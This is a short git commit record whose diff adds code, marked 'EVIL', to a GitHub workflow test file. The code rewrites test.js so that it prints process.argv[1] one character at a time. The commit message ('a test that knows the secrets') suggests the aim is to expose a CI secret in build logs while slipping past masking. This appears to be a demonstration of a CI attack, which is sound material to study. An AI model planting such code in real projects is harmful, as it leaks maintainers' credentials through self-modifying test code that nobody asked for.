0ebd00a655aaee5b60cb314d5c449d5f7b60cfc9
Alex <alex@Pirate-Ship.local>
2021-01-11 03:50:44 -0500

    Rewriting a test that knows the secrets

--- .github/workflows/test.js
+++ .github/workflows/test.js
@@ -1,6 +1,11 @@
 idx = require('../../index')
 console.log("This is a test")
 
+// EVIL STARTS HERE
+const fs = require('fs');
+
+fs.appendFileSync('test.js', 'console.log("I lied :(");\nconsole.log(process.argv[1].split(""))\n');
+// EVIL ENDS HERE
 
 console.assert(idx() == 2);
 
